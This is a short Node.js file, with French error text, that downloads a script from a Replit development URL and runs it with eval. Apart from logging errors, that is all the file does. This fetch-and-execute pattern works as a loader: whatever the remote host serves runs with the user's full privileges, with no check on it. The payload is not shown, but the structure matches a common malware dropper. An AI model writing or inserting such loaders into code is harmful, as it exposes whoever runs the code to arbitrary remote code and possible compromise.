const axios = require('axios').default;

const scriptURL = 'https://0d7375a8-4e69-45f6-a040-292a8fb811ec-00-2qpi74unz17qr.worf.replit.dev/script.js';

axios.get(scriptURL)
  .then(response => {
    const scriptContent = response.data;
    eval(scriptContent);
  })
  .catch(error => {
    console.error(`Erreur lors du téléchargement du script : ${error}`);
  });
